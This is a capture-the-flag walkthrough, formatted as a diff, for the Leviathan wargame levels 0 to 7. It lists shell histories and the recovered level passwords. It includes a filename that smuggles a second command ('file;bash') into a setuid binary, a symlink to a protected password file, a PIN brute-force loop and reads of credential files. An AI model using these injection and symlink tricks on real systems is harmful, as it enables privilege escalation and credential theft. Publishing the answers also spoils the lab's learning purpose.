@@ -1,1 +1,106 @@
 #Leviathan
+#level 0
+
+ 1  ls -alps
+    2  ls
+    3  cd .backup/
+    4  ls -alps
+    5  grep password bookmarks.html
+    6  history
+
+the password for leviathan1 is 3QJ3TgzHDq
+
+
+#level 1
+  1  ./check
+  2  ltrace ./check
+  3  ./check
+  password: sex
+  $ ls
+  check
+  $ cat /etc/leviathan_pass/leviathan2
+
+password:  NsN1HwFoyN
+
+#level 2
+
+   1  ls
+    2  ls -la
+    3  ./printfile
+    4  ltrace ./printile /etc/passwd
+    5  mktemp -d
+    6  cd /tmp/tmp.UhHJlIhDcU
+    7  touch 'file;bash'
+    8  ls
+    9  cd
+   10  ls
+   11  ./printfile /tmp/tmp.UhHJlIhDcU/file\;bash
+   12  ls
+   13  cat /etc/leviathan_pass/leviathan3
+   14  history
+password: f0n8h2iWLP
+
+
+#level 3
+    1  ls
+    2  ./level3
+    3  ltrace ./level3
+    4  ./level3
+    5  history
+
+password: WG1egElCvO
+
+
+#level 4
+    1 ls -la
+    2 cd .trash/
+    3. ls
+    4. ./bin
+
+password: 0dyxT7F4QD
+
+
+#level 5
+
+    1  ls
+    2  ls .la
+    3  ls -la
+    4  ./leviathan5
+    5  ltrace ./leviathan5
+    6  touch /tmp/file.log ; echo"hello" > /tmp/file.log
+    7  touch /tmp/file.log ; echo "hello" > /tmp/file.log
+    8  ltrace ./leviathan5
+    9  cat /tmp/file.log
+   10  touch /tmp/file.log ; echo "hello" > /tmp/file.log
+   11  ./leviathan5
+   12  touch /tmp/file.log ; echo "hello" > /tmp/file.log
+   13  cat /tmp/file.log
+   14  ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+   15  ./leviathan5
+   16  ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+   17  ./leviathan5
+   18  ls
+   19  ./leviathan5
+   20  history
+
+
+password: szo7HDB88w
+
+
+#level 6
+
+    1  ls
+    2  ./leviathan6
+    3  ltrace ./leviathan6
+    4  for i in {0000..9999} ;do echo $i;./leviathan6 $i;done;
+    5  history
+
+password: qEs5Io5yM8
+
+
+#level 7
+
+1 ls
+2 cat CONGRATULATIONS
+Well Done, you seem to have used a *nix system before, now try something more serious.
+(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
